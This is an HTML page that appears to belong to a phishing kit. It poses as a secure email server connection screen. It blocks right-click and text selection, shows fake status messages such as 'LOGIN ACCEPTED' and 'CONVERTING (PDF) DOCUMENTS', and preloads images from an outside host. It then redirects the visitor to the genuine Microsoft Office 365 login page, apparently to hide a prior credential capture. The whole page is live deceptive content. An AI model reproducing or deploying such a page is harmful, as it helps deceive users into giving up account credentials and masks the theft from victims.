<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252"></head><body ondragstart="return false" onselectstart="return false" oncontextmenu="return false" text="#UUUUUU" bgcolor="#FFFFFF"><h2>Connection to Secure Email Server In Progress...</h2>


<title>View Document... </title>





<div id="splashcontainer" style="width: 350px; position: absolute; visibility: visible; left: 508px; top: 307px;"><b><center><font size="3" face="BANK GOTHIC">LOGIN ACCEPTED</font></center></b></div><layer id="splashcontainerns" width="450"></layer>

<font size="18" face="Arial">

<script>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=3000

//configure destination URL

var targetdestination="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=3fe44bb6-6e1c-42a8-96b5-694798b08f09&protectedtoken=true&nonce=636831673475164725.d1294ca2-42fa-4a49-8101-38466d444d23&state=DcsxEoAwCAXRRMfjYAJ8ITkOY8bW0utL8bbbWkrZ05ZqzxQ3taFsrvCLDS7XuVgm7hCCPEEITBrcmXTAbAFYojXfo71ftB8"





var splashmessage=new Array()

var openingtags='<font face="BANK GOTHIC" size="3">'

splashmessage[0]='VERIFYING LOGIN'

splashmessage[1]='LOGIN ACCEPTED'

splashmessage[2]='LOADING'

splashmessage[3]='...FINALIZING VIEW...'

splashmessage[4]='CONVERTING (PDF) DOCUMENTS'

splashmessage[5]='PDF FORMAT NOT COMPACTIBLE'

splashmessage[6]='REDIRECTING..'

var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script>



</font>



<div align="right"> </div>

<script><!--

 var jv=1.0;

//--></script>



<script language="Javascript1.1"><!--

 jv=1.1;

//--></script>



<script language="Javascript1.2"><!--

 jv=1.2;

//--></script>



<script language="Javascript1.3"><!--

 jv=1.3;

//--></script>



<script language="Javascript1.4"><!--

 jv=1.4;

//--></script>





<noscript><IMG height=1 src="#"

width=1></noscript>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center"><img src="View%20Document_files/load.gif" "="" height="66" width="66"></p>



</body></html>